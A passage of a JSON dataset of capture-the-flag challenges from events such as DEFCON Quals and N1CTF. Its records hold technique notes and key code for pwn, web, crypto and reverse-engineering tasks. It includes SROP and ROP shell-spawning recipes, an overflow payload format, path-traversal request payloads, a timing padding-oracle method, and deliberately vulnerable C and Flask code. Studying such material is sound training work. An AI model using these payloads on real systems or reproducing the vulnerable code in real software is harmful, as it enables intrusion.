        "score": 442,
        "max_score": 1000,
        "difficulty": 0.442,
        "knowledge": [
            "When encountering a binary pwn challenge suggesting the use of the Sigreturn Oriented Programming (SROP) technique, three primary conditions must be met:\n   - A buffer overflow vulnerability to overwrite the stack's return address.\n   - The presence of `syscall` and `pop_rax` (or equivalent) gadgets within the binary for invoking the sigreturn syscall.\n   - Sufficient stack space to accommodate the sigcontext frame.\n   If these conditions are satisfied, an exploit can be crafted by overwriting the return address to redirect execution flow, employ `pop_rax` to set the `rax` register to `15` (the syscall number for `sigreturn` on x86_64 architectures), call `syscall`, and finally construct a frame on the stack to control the state of the processor at the time of the syscall. This technique allows for the execution of arbitrary code, even when direct code execution is not possible due to limitations or protections within the binary.",
            "In scenarios where direct execution of `/bin/sh` is the goal, and the binary meets the SROP prerequisites while also containing a string such as `/bin/sh`, crafting the sigcontext frame to invoke the `execve` syscall with the address of the string `/bin/sh` can effectively spawn a shell. This requires setting the `rax` register to the syscall number of `execve` (59 on x86_64), setting the `rdi` register to point to the string `/bin/sh`, and ensuring `rsi` and `rdx` are cleared (typically set to 0), which represent arguments and environment pointers respectively for the `execve` call.\n   \nExample payload component for setting up `rax` and invoking `syscall`:\n   \n`exploit=b'A'*8 + pop_rax + p64(0xf) + syscall_gadget + sigcontext_frame`\n\nThe `sigcontext_frame` would be structured to control register values during the execution of the `sigreturn` syscall, tailored to invoke `execve(\"/bin/sh\", 0, 0)`."
        ],
        "key": "```c\n#include <unistd.h>\n\nvoid vulnerable_function() {\n    char buffer[8];\n    read(0, buffer, 0x1f4);\n}\n\nint main() {\n    vulnerable_function();\n    return 0;\n}\n```"
    },
    {
        "name": "mra",
        "write_up": "dataset/raw/mra.md",
        "type": "crypto",
        "competition": [
            "DEFCON/2021/Quals",
            "https://ctftime.org/event/1254/tasks/"
        ],
        "score": 121,
        "max_score": 343,
        "difficulty": 0.35276967930029157,
        "knowledge": [
            "When dealing with aarch64/Linux-based statically-linked and stripped binaries that involve stack-based buffer overflows (BOF) and Return Oriented Programming (ROP) for exploiting, one efficient way to achieve arbitrary code execution is to use the `svc #0` instruction for system calls. This can be leveraged by finding a suitable gadget within the binary that allows controlling the system call number and arguments (`x0` to `x2`) by loading values from the stack and executing an `svc #0`. This method can be used to first execute a `read` system call to read arbitrary data into a controlled memory location (like the binary's BSS section), and then chain another system call like `execve` to execute arbitrary commands, such as spawning a shell.",
            "For exploiting string functions that process input based on special characters (like `%` in the case of `strcpy`), sending payloads that include these characters followed by null bytes can bypass length checks and enable buffer overflow. This technique can be particularly effective in situations where the vulnerable function relies on certain characters to transform the input in a way that does not properly account for null termination or that lacks boundary checks altogether. By carefully crafting payloads that exploit these behaviors, attackers can overflow buffers and control program flow even under constraints that would otherwise limit the payload size. A practical payload format in such cases could be `\"%\\x00<overflow_data_here>\"`, where `<overflow_data_here>` is crafted to overrun buffers and manipulate program execution flow, enabling the injection of ROP chains or other malicious code sequences."
        ],
        "key": "```c\nundefined8 main(undefined4 param_1,undefined8 param_2)  \n{  \n uint uVar1;  \n uint uVar2;  \n int iVar3;  \n undefined *puVar4;  \n undefined *puVar5;  \n ulong uVar6;  \n long lVar7;  \n undefined8 uStack0000000000000010;  \n undefined4 uStack000000000000001c;  \n undefined8 in_stack_00000020;  \n char cVar8;  \n char *pcVar9;  \n char *pcVar10;  \n char *pcVar11;\n\n uStack0000000000000010 = param_2;  \n uStack000000000000001c = param_1;  \n setvbuf(PTR_DAT_0041cf60,0,2,0);  \n setvbuf(PTR_FUN_0041cf58,0,2,0);  \n pcVar10 = \"GET /api/isodd/\";  \n pcVar9 = \"Buy isOddCoin, the hottest new cryptocurrency!\";  \n cVar8 = '\\0';  \n memset(&stack0x00000028,0,0x400);  \n pcVar11 = \"public\";  \n uVar2 = read(0,&stack0x00000028,0x3ff);  \n if ((8 < uVar2) && (iVar3 = strncmp(&stack0x00000028,pcVar10,0xf), iVar3 == 0)) {  \n   puVar4 = (undefined *)strchr(&stack0x00000028,10);  \n   if (puVar4 != (undefined *)0x0) {  \n     *puVar4 = 0;  \n     if (puVar4[-1] == '\\r') {  \n       puVar4[-1] = '\\0';  \n     }  \n   }  \n   puVar4 = (undefined *)strstr(&stack0x00000028,\" HTTP/\");  \n   if (puVar4 != (undefined *)0x0) {  \n     *puVar4 = 0;  \n   }  \n   puVar4 = (undefined *)strchr(&stack0x00000028,0x3f);  \n   if (puVar4 != (undefined *)0x0) {  \n     *puVar4 = 0;  \n     puVar4 = puVar4 + 1;  \n     iVar3 = strncmp(puVar4,\"token=\",6);  \n     if (iVar3 == 0) {  \n       pcVar11 = puVar4 + 6;  \n     }  \n   }  \n   puVar4 = &stack0x00000037;  \n   puVar5 = (undefined *)strchr(puVar4,0x2f);  \n   if (puVar5 != (undefined *)0x0) {  \n     *puVar5 = 0;  \n   }  \n   uVar6 = strlen(puVar4);  \n   iVar3 = strcmp(pcVar11,\"enterprise\");  \n   if (iVar3 == 0) {  \n     if (0xc < uVar6) {  \n       response(0x191,\"{\\n\\t\\\"error\\\": \\\"contact us for unlimited large number support\\\"\\n}\");  \n       return 0;  \n     }  \n   }  \n   else {  \n     iVar3 = strcmp(pcVar11,\"premium\");  \n     if (iVar3 == 0) {  \n       if (9 < uVar6) {  \n         response(0x191,\"{\\n\\t\\\"error\\\": \\\"sign up for enterprise to get large number support\\\"\\n}\");  \n         return 0;  \n       }  \n     }  \n     else {  \n       pcVar11 = \"public\";  \n       if (6 < uVar6) {  \n         response(0x191,\"{\\n\\t\\\"error\\\": \\\"sign up for premium or enterprise to get large numbersupport\\\"\\n}\");  \n         return 0;  \n       }  \n     }  \n   }  \n   iVar3 = strcpy(&stack0x00000428,puVar4);  \n}\n```\n\n```c\nint strcpy(long param_1,long param_2)  \n{  \n uint uVar1;  \n long lStack20;  \n long lStack28;  \n byte bStack37;  \n int iStack38;  \n int iStack3c;  \n  \n iStack3c = 0;  \n iStack38 = 0;  \n lStack20 = param_2;  \n lStack28 = param_1;  \n while (bStack37 = *(byte *)(lStack20 + iStack3c), bStack37 != 0) {  \n   if (bStack37 == 0x25) {  \n     uVar1 = htoi(*(undefined *)(lStack20 + (long)iStack3c + 1));  \n     bStack37 = htoi(*(undefined *)(lStack20 + (long)iStack3c + 2));  \n     bStack37 = (byte)((uVar1 & 0xff) << 4) | bStack37;  \n     iStack3c = iStack3c + 3;  \n   }  \n   else {  \n     iStack3c = iStack3c + 1;  \n   }  \n   *(byte *)(lStack28 + iStack38) = bStack37;  \n   iStack38 = iStack38 + 1;  \n }  \n return iStack38;  \n}\n```"
    },
    {
        "name": "MSB",
        "write_up": "dataset/raw/MSB.md",
        "type": "crypto",
        "competition": [
            "DownUnderCTF/2020",
            "https://ctftime.org/event/1084/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In a scenario with RSA cryptosystem where multiple public keys (n1, n2, n3, ...) are provided and it's known that one of the prime factors (p1, p2, p3, ...) of these keys slightly differs while the other prime factors stay the same across the different keys, one can apply the technique of implicit factoring. This method relies on constructing a matrix that represents the products and differences of the given ns (public keys) and utilizing the LLL (Lenstra\u2013Lenstra\u2013Lov\u00e1sz) algorithm to find the short lattice vector that leads to discovering the common prime factors. This approach can effectively break the RSA encryption under the specific condition that there's a small difference between the prime factors across different ns.",
            "When dealing with RSA challenges that provide multiple encryption instances involving primes of significantly different sizes (e.g., one prime is twice the size of the other), and especially when a part of the larger prime remains constant across different instances, constructing a matrix that encapsulates the key information (e.g., multiples of a large constant and differences between the ns) and applying the LLL algorithm to this matrix can reveal the shared prime factor. This technique leverages the mathematical properties of the LLL algorithm to find a basis for the lattice formed by the problem's parameters, thus enabling the factorization of the ns despite the only implicit hint of the shared bits."
        ],
        "key": "```python\n#!/usr/bin/sage\nfrom sage.all import random_prime\nfrom Crypto.Util.number import *\n\nflag = \"CENSORED!!!\"\nm = bytes_to_long(flag)\ne = 65537\nROUND = 4\n\np_0 = Integer(getPrime(2048))\nprint \"p_0 = \", p_0\nprint \"p_0.nbits() =\", p_0.nbits()\n# p_0.nbits() = 2048\n\nfor i in range(ROUND):\n   p = random_prime(p_0 + 2 ** 669, False, p_0)\n   q = random_prime(2 ** 1024, False, 2 ** 1023)\n   n = p * q\n   c = pow(m, e, n)\n   print((e, n, c))\n```"
    },
    {
        "name": "Multidimensional",
        "write_up": "dataset/raw/Multidimensional.md",
        "type": "reverse",
        "competition": [
            "HSCTF/2021",
            "https://ctftime.org/event/1264/tasks/"
        ],
        "score": -1,
        "max_score": 493,
        "difficulty": -1,
        "knowledge": [
            "In reverse engineering challenges where an application manipulates input through a series of transformations, reversing each transformation methodically can reveal the original input or flag. Start by identifying each transformation, then create inverse functions to apply in reverse order on the given or target string.",
            "Recursive functions are often used in programming challenges for complex operations such as repositioning characters based on specific conditions. To reverse such operations, one can create a reverse recursive function that counters the initial operations effect by systematically undoing each action. This technique is especially useful in puzzles involving spatial or time-based manipulations.\n\nExample payload does not apply directly to these points due to the nature of reverse engineering and recursive function explanation."
        ],
        "key": "```java\npublic class Multidimensional {\n    private static char[][] arr = new char[6][6];\n\n    public static void main(String[] args) {\n        int[][] t = {{8, 65, -18, -21, -15, 55},\n                {8, 48, 57, 63, -13, 5},\n                {16, -5, -26, 54, -7, -2},\n                {48, 49, 65, 57, 2, 10},\n                {9, -2, -1, -9, -11, -10},\n                {56, 53, 18, 42, -28, 5}};\n        String input = \"your_input_here\"; // Vulnerable point: user input\n        for (int x = 0; x < 6; x++) {\n            for (int y = 0; y < 6; y++) {\n                arr[x][y] = input.charAt(6 * x + y);\n            }\n        }\n        // Manipulate time\n        for (int j = 0; j < arr[0].length; j++) {\n            for (int i = 0; i < arr.length; i++) {\n                arr[i][j] += t[j][i];\n            }\n        }\n        // Manipulate space\n        manipulateSpace(35);\n        // Manipulate plane\n        for (int i = 0; i < 6; i++) {\n            for (int j = 0; j < 6; j++) {\n                arr[i][j] += i + 6 - j;\n            }\n        }\n        for (int i = 0; i < 3; i++) {\n            for (int j = 0; j < 3; j++) {\n                char temp = arr[i][j];\n                arr[i][j] = arr[5 - j][i];\n                arr[5 - j][i] = arr[5 - i][5 - j];\n                arr[5 - i][5 - j] = arr[j][5 - i];\n                arr[j][5 - i] = temp;\n            }\n        }\n        // Manipulate line\n        char[][] newArr = new char[arr.length][arr[0].length];\n        for (int i = 0; i < arr.length; i++) {\n            for (int j = 0; j < arr[0].length; j++) {\n                int p = i - 1, q = j - 1, f = 0;\n                boolean row = i % 2 == 0;\n                boolean col = j % 2 == 0;\n                if (row) {\n                    p = i + 1;\n                    f++;\n                } else\n                    f--;\n                if (col) {\n                    q = j + 1;\n                    f++;\n                } else\n                    f--;\n                newArr[i][j] = (char) (arr[p][q] + f);\n            }\n        }\n        arr = newArr;\n        String result = \"\";\n        for (int i = 0; i < 36; i++) {\n            result += arr[i % 6][i / 6];\n        }\n        System.out.println(result);\n    }\n\n    public static void manipulateSpace(int n) {\n        arr[(35 - n) / 6][(35 - n) % 6] -= (n / 6) + (n % 6);\n        if (n != 0) {\n            n--;\n            manipulateSpace(n);\n        }\n    }\n}\n```"
    },
    {
        "name": "music",
        "write_up": "dataset/raw/music.png.md",
        "type": "misc",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": -1.0,
        "max_score": 952,
        "difficulty": -1,
        "knowledge": [
            "When encountering files with seemingly random or obscured content, consider applying steganography decoding techniques, specifically targeting the Least Significant Bit (LSB) method. Tools like Zsteg can be employed to analyze the image and extract hidden information. This method is particularly useful in challenges where the file does not appear to contain any overtly useful data at first glance. \n   - Example command: `zsteg -all filename.png`",
            "If the output from steganography tools yields unusual or encrypted text, conduct online searches with the obtained strings. This approach can reveal hints or direct solutions, especially in challenges where the output relates to widely known references or URLs. The extracted information might not be the flag itself but rather a clue leading to the solution.\n   - Unable to provide a specific search query example as it will vary depending on the output text extracted from the steganography tool."
        ],
        "key": "```python\ndef extract_lsb(image_path):\n    from PIL import Image\n    img = Image.open(image_path)\n    binary_data = \"\"\n    for pixel in img.getdata():\n        for color in pixel[:3]:  # Assuming RGB\n            binary_data += bin(color)[-1]  # Extract LSB\n    return binary_data\n\ndef binary_to_text(binary_data):\n    text = \"\"\n    for i in range(0, len(binary_data), 8):\n        byte = binary_data[i:i+8]\n        text += chr(int(byte, 2))\n    return text\n\nimage_path = \"music.png\"\nbinary_data = extract_lsb(image_path)\nhidden_message = binary_to_text(binary_data)\nprint(hidden_message)\n```"
    },
    {
        "name": "My First C Program!",
        "write_up": "dataset/raw/My First C Program!.md",
        "type": "This write-up describes a reverse engineering challenge.",
        "competition": [
            "DownUnderCTF/2023",
            "https://ctftime.org/event/1954/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing C programs or similar code snippets in CTF challenges, it's crucial to pay attention to unconventional syntax or semantics introduced by the challenge, such as custom operators (e.g., \"!!\" and \"!!!\") or unexpected language behaviors (e.g., arrays working from -1). Understanding these peculiarities can be key to deciphering the code's logic and finding the flag. This approach can be applied when encountering code that deviates from standard programming patterns or syntax, indicating that the challenge might involve interpreting or correcting the given code based on its unique rules.",
            "String manipulation techniques, including string interpolation, concatenation, and character manipulation through custom functions, often play a significant role in solving CTF challenges. Knowledge of how these operations work, even under non-standard conditions (like in a fictional programming language or with unusual syntax), can help in piecing together the flag from various code segments. This strategy is valuable in challenges where the flag is split into different components or obscured through complex operations. Understanding the basic principles of these manipulations allows for the application of similar logic across different programming languages and scenarios encountered in challenges."
        ],
        "key": "```c\nncti thonk(a, b) => {  \n  const var brain_cell_one = \"Th\"!  \n  const const const const bc_two = \"k\"!  \n  const const var rett = \"${brain_cell_one}}{$a}{b}!}!\"!!  \n  const var ret = \"${brain_cell_one}${a}${b}${bc_two}\"!  \n  return ret!!!  \n  return rett!  \n}  \n\nction get_a_char() => {  \n const var dank_char = 'a'!  \n  if (;(7 ==== undefined)) {  \n     dank_char = 'I'!!  \n }  \n}  \n\nfun math() => {  \nprint(\"MatH!\")  \nreturn 10 % 5  \n}  \n```"
    },
    {
        "name": "My Project",
        "write_up": "dataset/raw/My Project.md",
        "type": "This write-up describes a challenge that involves exploiting a vulnerability related to path traversal in a web application. Upon analyzing the provided code snippet, it is clear that the challenge falls under the category of **web**.",
        "competition": [
            "Chujowy/2020",
            "https://ctftime.org/event/1087/tasks/"
        ],
        "score": 203,
        "max_score": 500,
        "difficulty": 0.406,
        "knowledge": [
            "When attempting a path traversal exploit in a web application, identifying functionality that manipulates files\u2014such as concatenating user-provided files\u2014can be leveraged to place files in unintended directories. This method is particularly useful if the application appends user data to files within server-controlled directories without proper validation of file names or paths. \n    - Example payload snippet for path traversal using file manipulation functionality:  \n    ```python\n    files = {\"file\": (\"filename\", \"filecontent\")}\n    params = {\"filename1\": \"../secure/targetfilename\"}\n    response = requests.post(\"http://targetsite.com/concat\", files=files, params=params)\n    ```",
            "When exploiting path traversal vulnerabilities, especially in web applications hosting critical functionality like accessing a secure directory, constructing the payload requires careful consideration of the web application's file handling logic, including how files are named, stored, and accessed. This strategy can enable an attacker to bypass checks or restrictions placed on accessing or executing specific files (e.g., accessing a file intended to be secure by manipulating the path to escape the intended directory).\n    - Example payload for bypassing restrictions to execute or access secure files:  \n    ```python\n    response = requests.get(\"http://targetsite.com/flag/{}\".format(\"filename\" + \"calculatedUUID\"))\n    ```"
        ],
        "key": "```python\n@app.route('/concat', methods=['POST'])  \ndef concat():  \n   with open('./files/' + request.args['filename1'], 'rb') as f2:  \n       s2 = f2.read()  \n   f = request.files['file']  \n   s = f.read()  \n   if not check_tekstfile(s):  \n       return 'not a tekst'  \n   uuid = uuid1().hex  \n   with open('./files/' + f.filename + uuid, 'wb') as ff:  \n       ff.write(s2 + s)  \n   return 'link: Klik'\n\n@app.route('/flag/<name>', methods=['GET'])  \ndef flag(name):  \n   from pathlib import Path  \n   from subprocess import check_output  \n   import os  \n   path = Path('./secure/').joinpath(name)  \n   assert path.parent.name == 'secure'  \n   assert path.name != 'print_flag'  \n   assert open(path, 'rb').read(1) != ord('#')  \n   os.chmod(path, 0o700, follow_symlinks=False)  \n   return check_output([path]).decode('ascii')  \n```"
    },
    {
        "name": "My Sieve",
        "write_up": "dataset/raw/My Sieve.md",
        "type": "crypto",
        "competition": [
            "Crypto/2021",
            "https://ctftime.org/event/1258/tasks/"
        ],
        "score": 477,
        "max_score": 477,
        "difficulty": 1.0,
        "knowledge": [
            "When dealing with RSA encryption challenges and a given encrypted message, if you have an output file from a factorization tool like msieve for a large number associated with the challenge, you can use the factors found to compute the private key and decrypt the message. This typically involves decomposing the modulus N into its prime factors, computing \u03c6(N) as (p-1)*(q-1) where p and q are the prime factors, then computing the modular multiplicative inverse of e mod \u03c6(N) to get the private key d. The encrypted message can then be decrypted using d.\n   \n   - Given:\n     - Two prime factors \\( p \\) and \\( q \\)\n     - Public exponent \\( e \\)\n     - Encrypted message \\( enc \\)\n   - Compute:\n     - \\( N = p \\cdot q \\)\n     - \\( \\phi(N) = (p-1) \\cdot (q-1) \\)\n     - \\( d = e^{-1} \\mod \\phi(N) \\)\n   - Decrypt the message:\n     - \\( \\text{flag} = enc^d \\mod N \\)\n   - Python snippet for RSA decryption:\n     ```python\n     from Crypto.Util.number import *\n     \n     p = 37517726695590864161261967849116722975727713562769161\n     q = 41223455646589331474862018682296591762663841134030283\n     e = 0x10001\n     N = p * q\n     phi = (p - 1) * (q - 1)\n     d = pow(e, -1, phi)\n     enc = 17774316754182701043637765672766475504513144507864625935518462040899856505354546178499264702656639970102754546327338873353871389580967004810214134215521924626871944954513679198245322915573598165643628084858678915415521536126034275104881281802618561405075363713125886815998055449593678564456363170087233864817\n     flag = long_to_bytes(pow(enc, d, N))\n     print(flag)\n     ```",
            "In RSA CTF challenges where the public key or parts of it seem corrupted or partially hidden, try all possible substitutions if the number of unknowns is small. Specifically, when a public key component such as the modulus N is only partially given with missing bits represented by placeholders (e.g., `*`), brute-force through all possible values of these placeholders if feasible. A practical approach is to compute the GCD (Greatest Common Divisor) of all candidate moduli with a known related value to identify the correct modulus by finding a GCD greater than 1.\n   \n   - Given:\n     - Partial or corrupted modulus \\( N \\) with unknown bits\n     - A related integer \\( X \\) from factorization data (e.g., from msieve output)\n   - Method:\n     - Iterate through all possible substitutions for the unknown bits in \\( N \\)\n     - Compute \\( \\gcd(N, X) \\) for each candidate \\( N \\)\n     - If \\( \\gcd(N, X) > 1 \\), the candidate \\( N \\) shares a factor with \\( X \\), indicating a potential match\n   - Python snippet to find the correct \\( N \\) by searching through all possible combinations of the missing bits:\n     ```python\n     from math import gcd\n\n     # Example with simplified numbers and scenario\n     corrupt_N = 0xA... # partially known N with placeholders for missing bits\n     X = 0x1...  # known integer related to N, from msieve output\n     \n     for possible_N in all_possible_substitutions(corrupt_N):\n         if gcd(possible_N, X) > 1:\n             print(f\"Found matching N: {possible_N}\")\n             break\n     ```\n   - Note: This approach requires adjusting the search method `all_possible_substitutions` to fit the scenario, which might involve replacing characters or bits at specified positions."
        ],
        "key": "```python  \nfrom math import gcd\n\ncorrupt_N = 0xa4460442c93712c2504a98445057f04792ead2e509d8cfb466d7c3a3c6eb964f700051eab3abb7c72127b2d8d104b6b6a5fc013bbf60f2e7d0d81e8440028b9641dd376585a7bd4e665a86117293661c88fca80f853ad0567021b3319f2ec4ec5a57be2faaa7ab8f1c91235e2b5d9f9039c34cfd330cf38874ae5fc82aaa96b1  \nX = 0x1dabd3bb8e99101030cd7094eb15dd525cb0f02065694604071c2a8b10228f30cc12d08fc9caa8d97c65ff481  \noffsets = [356, 620, 752]\n\nfor a in range(64):  \n   for b in range(64):  \n       for c in range(64):  \n           N = corrupt_N | (a<<offsets[0]) | (b<<offsets[1]) | (c<<offsets[2])  \n           if gcd(N, X) > 2**32:  \n               print(\"w00t\")  \n               print(a, b, c)  \n               print(N)  \n               print(gcd(N, X))  \n```"
    },
    {
        "name": "Mysterious Broadcast",
        "write_up": "dataset/raw/Mysterious Broadcast.md",
        "type": "web",
        "competition": [
            "SpaceHeroes/2022",
            "https://ctftime.org/event/1567/tasks/"
        ],
        "score": 100,
        "max_score": 991,
        "difficulty": 0.10090817356205853,
        "knowledge": [
            "When faced with a mysterious or encrypted message in a CTF challenge, examining the format and content for patterns or known encodings can be a first step. If the message appears to be binary and related to a hint given in the challenge description (such as a reference to a specific number that suggests a bit-length), one approach is to break down the message into segments based on this bit-length and then convert these segments into a more understandable format like ASCII. Tools and commands like `fold`, `tr`, and scripting in Bash can be effective in manipulating the message format for further analysis.\n    - Example approach: Convert a binary sequence split into 7-bit segments into ASCII characters.\n    - Command used: `fold -b7 sequence.in | tr \"\\n\" \" \" > data.in` followed by a binary to ASCII conversion script.",
            "If the output from converting binary data into ASCII yields a string that seems encoded but not directly readable, it's necessary to identify the encoding used and apply the correct decoding technique. A common encoding encountered in CTF challenges is Base64. The Linux command line provides tools such as `base64` for decoding such encoded strings. This step often reveals hidden messages, keys, or flags necessary for challenge completion.\n    - Example approach: Decode a Base64 encoded string to reveal the flag or message.\n    - Command used: `echo \"encoded_string\" | base64 -d`"
        ],
        "key": "```bash\n#!/bin/bash\nloop=\"http://173.230.134.127/seq/f6456df7-ddc7-473f-89c8-89f083bb938f\"\nfor i in {1..800}\ndo\n  curl $loop\ndone\n```"
    },
    {
        "name": "Mysterious Masquerading Message",
        "write_up": "dataset/raw/Mysterious Masquerading Message.md",
        "type": "crypto",
        "competition": [
            "RACTF/2020",
            "https://ctftime.org/event/1051/tasks/"
        ],
        "score": 100,
        "max_score": 700,
        "difficulty": 0.14285714285714285,
        "knowledge": [
            "When encountering strings within data that looks like encoded or encrypted content, consider classical ciphers and common encoding schemes as initial vectors for decryption. Caesar cipher (or ROT13 for a 26-letter alphabet) can be identified by simple substitution patterns, Base64 encoding often ends with \u2018=\u2019 symbols, and hexadecimal strings usually consist of characters ranging from 0-9 and A-F. These can serve as clues to start the decryption process. \n\n   - Caesar cipher/ROT13 example payload: Given a ciphertext \"tbbq yhpx:)\", decoding it with ROT13 would reveal \"good luck:)\".",
            "When provided with hexadecimal strings in the context of cryptographic challenges, and clues hint towards encryption keys and initialization vectors (IVs), the strings could represent AES encryption details. The process involves converting hexadecimal representations to their ASCII equivalents which could signify keys, IVs, or encrypted messages. For AES decryption, having the ciphertext, the key, and IV allows for the decryption using AES Decrypt tools.\n\n   - AES decryption example payload: Given ciphertext \"90988c9befe5ea3f5a91effe03060a8714dfc20088415570b394ce9cd32be718\", key \"ineedtoopenlocks\", and IV \"initialisation12\", use an AES Decrypt tool configured for the appropriate mode (e.g., CBC) to decrypt the message."
        ],
        "key": "```python\ndef decrypt_aes(ciphertext, key, iv):\n    from Crypto.Cipher import AES\n    import binascii\n\n    # Convert hex to bytes\n    ciphertext_bytes = binascii.unhexlify(ciphertext)\n    key_bytes = binascii.unhexlify(key)\n    iv_bytes = binascii.unhexlify(iv)\n\n    # Create AES cipher\n    cipher = AES.new(key_bytes, AES.MODE_CBC, iv_bytes)\n\n    # Decrypt the ciphertext\n    decrypted = cipher.decrypt(ciphertext_bytes)\n\n    return decrypted\n\nciphertext = \"90988c9befe5ea3f5a91effe03060a8714dfc20088415570b394ce9cd32be718\"\nkey = \"696e656564746f6f70656e6c6f636b73\"  # ineedtoopenlocks\niv = \"696e697469616c69736174696f6e3132\"  # initialisation12\n\ndecrypted_message = decrypt_aes(ciphertext, key, iv)\nprint(decrypted_message)\n```"
    },
    {
        "name": "Mysterious RSA",
        "write_up": "dataset/raw/Mysterious RSA.md",
        "type": "crypto",
        "competition": [
            "MetaCTF/2020",
            "https://ctftime.org/event/1106/tasks/"
        ],
        "score": 350,
        "max_score": 525,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "For RSA encryption challenges where the same message is encrypted multiple times with different public keys (N, E), H\u00e5stad's broadcast attack is applicable. This attack leverages the fact that with enough (E) ciphertexts, one can use the Chinese Remainder Theorem (CRT) to recover the plaintext message. The attack is particularly effective when the public exponent E is small and the same for all encryptions. \n   \n   Example condition: The RSA encryption is using a small, public exponent `E` and encrypting the same message with different `N` values.\n   \n   Sample Python snippet for collection:\n   ```python\n   # Example for collecting cipher texts with their N and E\n   import requests\n   import re\n   \n   url = \"https://example-ctf-site.com/rsa-challenge\"\n   for i in range(100):  # Collect multiple samples\n       response = requests.get(url).text\n       # regex to strip HTML and extract N, E, C\n       data = re.sub('<[^<]+?>', '', response).split('\\n\\n')\n       n, e, ct = data[0], data[1], data[2]\n       # Process and store N, E, and C for attack\n   ```",
            "Implementing H\u00e5stad's broadcast attack involves using the Chinese Remainder Theorem (CRT) to combine the collected ciphertexts and recover the original message. This step computes a value `x` from the ciphertexts and moduli, then extracts the `e`th root of `x` to get the plaintext. The CRT computation combines the different ciphertexts (each corresponding to a different N) into a single x value, from which the plaintext message is derived if x is smaller than the smallest N.\n\n   Example condition: Possessing multiple ciphertexts for the same plaintext encrypted with RSA, where each ciphertext has a unique modulus `N` but shares a common exponent `E`.\n\n   Sample Python snippet for attack implementation:\n   ```python\n   import gmpy2\n   \n   def crt_attack(ciphertexts, moduli, e):\n       # Chinese Remainder Theorem to find x satisfying x \u2261 c_i (mod n_i) for all i\n       x = gmpy2.crt(ciphertexts, moduli)[0]\n       # Assuming the plaintext m is small enough, try extracting the e'th root of x\n       m, exact = gmpy2.iroot(x, e)\n       if exact:\n           return int(m).to_bytes((m.bit_length() + 7) // 8, 'big').decode('utf-8')\n       else:\n           return \"Failed to extract the message\"\n   \n   # Example usage\n   C = [123456, 234567, 345678]  # Example ciphertexts\n   N = [987654321, 876543219, 765432198]  # Corresponding moduli\n   e = 3  # Common exponent\n   message = crt_attack(C, N, e)\n   print(\"Recovered message:\", message)\n   ```\nThis Python script demonstrates the steps necessary to implement H\u00e5stad's attack, showcasing how RSA's mathematical properties can be exploited under specific conditions to decrypt a message without the private key."
        ],
        "key": "```python\nimport math  \nimport functools  \nimport gmpy2\n\n# Get the Flag (only for CTFs)  \ndef ReverseX(x, e) :  \n\tm = gmpy2.iroot(x, e)[0]  \n\tsize = int(math.log(m, 10) + 1)  \n\tprint(\"Flag : \\n\"+\"\".join([chr((m >> j) & 0xff) for j in reversed(range(0, size << 3, 8))]))  \n\treturn 1\t\n\n# Step-by-step CRT implementation (cf. demo precedente)  \ndef CrtComputation(C_i, N_i) :  \n\tmu = list()  \n\tnu = list()  \n\te = list()  \n\t(x_i, N) = (0, 1)  \n\t\"\"\"  \n\tCalcul mu_i = PI_(j=1,j!=i)^k(n_j)  \n\t\"\"\"  \n\tN = functools.reduce(lambda a, b: a*b, N_i)  \n\tfor n_i in N_i :  \n\t\tmu.append(N//n_i)  \n\t\"\"\"  \n\tCalcul nu_i inverse modulo n_i des mu_i  \n\tuseful link :  \nhttps://en.wikibooks.org/wiki/Algorithm_Implementation/Mathematics/Extended_Euclidean_algorithm  \n\t\"\"\"  \n\tfor mu_i, n_i in zip(mu, N_i) :  \n\t\tnu.append(gmpy2.invert(mu_i, n_i))  \n\t\"\"\"  \n\tCalcul e_i = nu_i * mu_i  \n\t\"\"\"  \n\tfor mu_i, nu_i in zip(mu, nu) :  \n\t\te.append(mu_i*nu_i)  \n\t\"\"\"  \n\tCalcul et retour de x  \n\t\"\"\"\t  \n\tfor e_i, a_i in zip(e, C_i) :\t  \n\t\tx_i += e_i*a_i  \n\tx = x_i % N  \n\treturn x \n\ndef HastadAttack(C, N, e):  \n\tx = CrtComputation(C, N)  \n\treturn ReverseX(x, e)\n\ndef main():  \n\tC = []  \n\tN = []  \n\te = 0x43\n\n\twith open(\" 0x43.txt\", \"r\") as f:  \n\t\tlines = f.read().split('\\n')  \n\t\tfor i, line in enumerate(lines):  \n\t\t\tif i <= e*2-1:  \n\t\t\t\tif line[0] == 'N':  \n\t\t\t\t\tN.append(int(line[3:], 16))  \n\t\t\t\telse:  \n\t\t\t\t\tC.append(int(line[3:], 16))  \n\tHastadAttack(C, N, e)\n\nif __name__ == \"__main__\":  \n\tmain()\t\t\n```"
    },
    {
        "name": "n1ogin",
        "write_up": "dataset/raw/n1ogin.md",
        "type": "crypto",
        "competition": [
            "N1CTF/2021",
            "https://ctftime.org/event/1367/tasks/"
        ],
        "score": 688,
        "max_score": 1000,
        "difficulty": 0.688,
        "knowledge": [
            "When facing hybrid encryption mechanisms within a CTF challenge, particularly those involving RSA, AES, and HMAC, an effective attack strategy involves performing a CBC padding oracle attack when direct cryptographic vulnerabilities seem mitigated. Given that error messages from the server are generic or indistinguishable, one can use timing differences in the server's response to differentiate between types of errors encountered (e.g., padding errors vs HMAC verification errors). This approach requires analyzing how server response times vary when incorrect padding or HMAC values are supplied, using the premise that HMAC computation typically incurs a noticeable delay compared to padding checks.",
            "In scenarios where encryption protocols do not directly leak error information, and timing attacks are viable, implementing a remote time-based attack can be an effective method to extract sensitive information, like decryption keys or plaintext. This involves carefully crafting payloads that force the server into different computation paths (e.g., handling padding errors vs HMAC verification), then measuring the time it takes for the server to respond. A significant aspect of this approach requires distinguishing between genuine timing differences and those caused by network jitter or server load, often achieved by sending multiple requests and analyzing the minimum response time to mitigate random variables' impact."
        ],
